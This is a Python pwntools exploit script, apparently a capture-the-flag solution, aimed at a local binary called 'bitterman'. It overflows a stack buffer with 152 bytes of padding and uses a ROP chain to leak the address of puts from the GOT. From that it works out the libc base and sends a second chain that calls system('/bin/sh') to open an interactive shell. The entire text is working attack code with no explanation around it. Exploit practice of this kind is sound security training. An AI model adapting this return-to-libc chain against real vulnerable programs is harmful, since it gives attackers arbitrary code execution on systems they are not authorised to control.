from pwn import *
#context.terminal = (["terminator", "-e"])
libc = ELF('./libc.so.6')
binary = ELF('./bitterman')
p = process("./bitterman")
context(os="Linux", arch="amd64")
#context.log_level = "DEBUG"


padding = "A"*152
pop_rdi = p64(0x400853)
puts_got = p64(binary.got['puts'])
puts_plt = p64(binary.plt['puts'])
main_addr = p64(binary.symbols['main'])
payload = padding + pop_rdi + puts_got + puts_plt + main_addr

p.recvuntil("name?")
p.sendline("knap")
p.recvuntil("message:")
p.sendline("1024")
p.recvuntil("text:")
p.sendline(payload)
p.recvuntil("Thanks!")
leaked_puts =  p.recv()[:8].strip('\n').ljust(8,'\x00')
puts_int = u64(leaked_puts)
log.info("Puts leaked at 0x%x" % puts_int)

libc_put = libc.symbols['puts']
libc_system = libc.symbols['system']
libc_binsh = libc.search('/bin/sh').next()

pop_rdi = p64(0x400853)
offset = puts_int - libc_put
system = p64(offset + libc_system)
binsh = p64(offset + libc_binsh)

payload1 = padding + pop_rdi + binsh + system

p.sendline("knap")
p.recvuntil("message:")
p.sendline("1024")
p.recvuntil("text:")
p.sendline(payload1)
p.recvuntil("Thanks!")

p.interactive()
